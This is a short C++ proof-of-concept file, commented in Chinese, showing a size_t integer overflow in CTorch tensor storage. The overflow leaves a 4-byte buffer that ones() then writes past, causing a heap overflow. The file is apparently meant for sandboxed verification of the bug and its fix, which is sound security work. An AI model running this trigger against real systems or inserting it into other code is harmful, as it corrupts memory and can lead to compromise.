// (SECURITY_SENSITIVE) CTorch Storage 整数溢出 PoC
// 本地沙箱运行，仅用于验证漏洞存在与修复有效性。
// 禁止用于未授权系统或生产环境。

#include "Tensor.h"
#include <climits>
#include <cstddef>
#include <iostream>

int main() {
    // N * sizeof(float) 在 size_t 上回绕为 4 字节，
    // 但 Tensor::_shape/_size 仍保存 N，后续按元素循环会越界。
    size_t N = (SIZE_MAX / sizeof(float)) + 2;

    std::cout << "[PoC] requested elements: " << N << std::endl;
    std::cout << "[PoC] requested bytes (mod 2^64): " << (N * sizeof(float)) << std::endl;

    // zero_init=false 避免 zero() 在构造期触发同样的溢出循环
    Tensor t(N, DType::kFloat, DeviceType::kCPU, /*zero_init=*/false);

    std::cout << "[PoC] tensor numel: " << t.numel() << std::endl;
    std::cout << "[PoC] triggering out-of-bounds write via ones()..." << std::endl;

    t.ones();  // 循环 N 次，向 4 字节缓冲区写入，触发 heap-buffer-overflow

    std::cout << "[PoC] finished (should not reach here if ASan is active)" << std::endl;
    return 0;
}
